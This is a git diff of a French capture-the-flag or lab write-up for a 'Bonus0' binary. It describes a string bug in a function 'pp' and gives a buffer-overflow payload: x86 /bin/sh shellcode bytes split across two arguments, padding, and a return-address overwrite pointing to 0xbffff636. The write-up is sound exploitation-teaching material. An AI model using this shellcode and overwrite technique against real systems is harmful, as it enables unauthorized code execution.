@@ -1,3 +1,5 @@
+# Bonus0
+
 - en lisant le code et en l'executant on comprend qu'il y a un bug/faille
 - dans la fonction pp le \0 de la 1er string est remplacer par un espace
 - se qui fait quequand la premiere string est entierement remplis il considere str1 et str2 comme une string
@@ -46,9 +48,11 @@ puts("BBBBBBBBBBBBBBBBBBB AAAAAAAAAAAA"...)                                     
 </pre>
 - On a l'addresse de notre stack (*0xbffff636*)
 - Notre shellcode fait 21 carrecter donc on le decoupe en deux 20 dans le premier argument et 1 dans le deuxieme
+
 | Arg 1 | Arg 2 |
 |-------|-------|
 | `\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\n` | `\80` + `B` \* 8 + `0xbffff636` + `B` \* 20 + `\n`|
+
 - Donc en gros on overide la return address pour qu'elle renvoie sur notre shellcode
 - On utilise un code en C car il y a des problemes avec python
 ```
